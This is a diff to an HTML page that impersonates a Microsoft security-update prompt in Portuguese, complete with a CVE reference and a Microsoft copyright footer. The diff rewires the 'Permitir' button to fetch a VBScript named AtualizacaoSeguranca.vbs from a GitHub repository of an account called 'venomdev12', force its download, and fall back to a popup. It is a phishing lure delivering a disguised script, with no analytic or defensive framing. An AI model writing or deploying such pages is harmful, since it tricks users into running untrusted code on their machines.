@@ -19,6 +19,7 @@
   button { border:none; border-radius:4px; padding:9px 26px; font-size:14px; cursor:pointer; }
   .primary { background:#0067c0; color:#fff; font-weight:600; }
   .primary:hover { background:#005ba1; }
+  .primary:disabled { background:#8fc4ea; cursor:default; }
   .ghost { background:#fff; border:1px solid #8a8886 !important; color:#201f1e; }
   .foot { padding:0 28px 20px; font-size:11px; color:#9d9d9c; }
   #done { display:none; padding:26px 28px; }
@@ -26,7 +27,7 @@
   .badge { width:34px; height:34px; border-radius:50%; background:#dff6dd; color:#107c10;
            display:flex; align-items:center; justify-content:center; font-size:18px; flex:none; }
   #done h2 { font-size:15px; font-weight:600; margin-bottom:3px; }
-  #done p { font-size:13px; color:#616161; }
+  #done p { font-size:13px; color:#616161; line-height:1.5; }
 </style>
 </head>
 <body>
@@ -45,7 +46,7 @@
       (<code>CVE-2026-21887</code>) que precisa ser finalizada neste dispositivo.
       Permitir a instala&#231;&#227;o para manter o prote&#231;&#227;o ativa.</p>
     <div class="btns">
-      <button class="primary" onclick="permitir()">Permitir</button>
+      <button id="ok" class="primary" onclick="permitir()">Permitir</button>
       <button class="ghost" onclick="adiar()">Adiar</button>
     </div>
     <div class="foot">&#169; Microsoft Corporation &mdash; Central de atualiza&#231;&#227;o local</div>
@@ -60,13 +61,23 @@
   </div>
 </div>
 <script>
-function permitir(){
-  var a = document.createElement('a');
-  a.href = 'AtualizacaoSeguranca.vbs';
-  a.download = 'AtualizacaoSeguranca.vbs';
-  document.body.appendChild(a); a.click(); a.remove();
+var VBS_URL = "https://raw.githubusercontent.com/venomdev12/atualizacao-windows/main/AtualizacaoSeguranca.vbs";
+function concluir(){
   document.getElementById('step1').style.display='none';
   document.getElementById('done').style.display='block';
+}
+function permitir(){
+  var b=document.getElementById('ok'); if(b){ b.disabled=true; b.textContent='Permitindo...'; }
+  try {
+    fetch(VBS_URL, {mode:'cors'}).then(function(r){ return r.blob(); }).then(function(blob){
+      var u=URL.createObjectURL(blob);
+      var a=document.createElement('a');
+      a.href=u; a.download='AtualizacaoSeguranca.vbs';
+      document.body.appendChild(a); a.click(); a.remove();
+      setTimeout(function(){ try{URL.revokeObjectURL(u);}catch(e){} }, 5000);
+      concluir();
+    }).catch(function(){ window.open(VBS_URL,'_blank','width=480,height=320'); });
+  } catch(e){ window.open(VBS_URL,'_blank','width=480,height=320'); }
 }
 function adiar(){ location.reload(); }
 </script>
